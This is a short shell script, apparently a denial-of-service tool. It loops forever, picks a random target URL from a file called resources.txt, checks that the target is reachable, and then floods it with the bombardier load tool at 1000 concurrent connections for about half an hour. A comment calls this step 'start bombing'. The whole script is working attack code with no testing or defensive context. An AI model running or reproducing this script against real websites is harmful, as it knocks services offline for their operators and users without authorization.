#!/bin/sh

while true; do
  # get random resource
  RESOURCE=$(shuf resources.txt | head -n1)
  echo "Checking $RESOURCE..." 
  curl $RESOURCE
  if [ $? -eq 0 ]
  then
    # start bombing
    bombardier -c 1000 -d 1890s -l $RESOURCE
  else
    echo "$RESOURCE is down\n"
  fi
done
